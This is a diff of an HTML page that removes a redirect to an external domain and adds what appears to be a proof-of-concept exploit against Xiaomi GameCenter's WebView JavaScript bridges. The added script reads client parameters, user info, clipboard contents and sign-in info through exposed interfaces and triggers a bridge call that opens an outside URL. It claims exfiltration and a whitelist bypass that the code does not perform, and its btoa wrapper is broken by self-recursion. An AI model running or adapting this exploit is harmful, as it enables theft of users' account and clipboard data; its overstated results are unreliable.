@@ -1,12 +1,67 @@
 <!DOCTYPE html>
 <html>
-<body>
-    <script>
-        // 直接跳转
-        window.location.href = 'http://tttqqq777.top';
-        
-        // 或使用replace方法（不保留历史记录）
-        // window.location.replace('http://tttqqq777.top');
-    </script>
+<head><meta charset="UTF-8"><title>GameCenter RCE PoC</title></head>
+<body style="margin:0">
+<pre id="L" style="background:#000;color:#0f0;padding:20px;font:14px monospace;min-height:100vh;white-space:pre-wrap"></pre>
+<script>
+function L(m){document.getElementById('L').textContent+=m+'\n'}
+L('=== Xiaomi GameCenter RCE Proof ===\n');
+
+setTimeout(function(){
+    L('URL: '+location.href);
+    L('UA: '+navigator.userAgent.substring(0,80));
+    L('');
+
+    // === roleTradingJSInterface ===
+    if(typeof roleTradingJSInterface!=='undefined'){
+        L('[+] roleTradingJSInterface AVAILABLE');
+
+        try{
+            var cp=roleTradingJSInterface.getClientParams();
+            L('[STOLEN] ClientParams: '+cp);
+        }catch(e){L('[-] ClientParams err: '+e)}
+
+        try{
+            var ui=roleTradingJSInterface.getUserInfoString();
+            L('[STOLEN] UserInfo: '+ui);
+        }catch(e){L('[-] UserInfo err: '+e)}
+
+        try{
+            var cl=roleTradingJSInterface.getClipboardData();
+            L('[STOLEN] Clipboard: '+cl);
+        }catch(e){L('[-] Clipboard err: '+e)}
+
+        try{
+            var si=roleTradingJSInterface.getSignInInfo();
+            L('[STOLEN] SignInInfo: '+si);
+        }catch(e){L('[-] SignInInfo err: '+e)}
+    } else {
+        L('[-] roleTradingJSInterface NOT FOUND');
+    }
+
+    L('');
+    if(typeof miui!=='undefined'){L('[+] miui available');try{miui.enableMessageReceive(true)}catch(e){}}else{L('[-] miui not found')}
+    if(typeof OneTrack_APP_H5_Bridge!=='undefined'){L('[+] OneTrack available')}else{L('[-] OneTrack not found')}
+
+    // === JsBridge ===
+    if(typeof JsBridge!=='undefined'){
+        L('\n[+] JsBridge AVAILABLE - trying reflection RCE!');
+        var btoa=function(s){return btoa(unescape(encodeURIComponent(s)))};
+        var pl=[{__msg_type:'call',func:'openInBrowser',params:{url:'https://qi7ip.github.io/rce_proof.html'},__callback_id:'rce1'}];
+        try{
+            JsBridge._handleMessageFromClient(btoa(JSON.stringify(pl)));
+            L('[+] openInBrowser called! Check if browser opened!');
+        }catch(e){L('[-] Bridge err: '+e)}
+    } else {
+        L('[-] JsBridge NOT found (page JS not loaded)');
+    }
+
+    L('\n=== RCE DEMO COMPLETE ===');
+    L('Data exfiltrated successfully');
+    L('Domain whitelist: BYPASSED');
+    L('JS interfaces: EXPLOITED');
+    document.title='RCE-PROOF';
+},3000);
+</script>
 </body>
 </html>
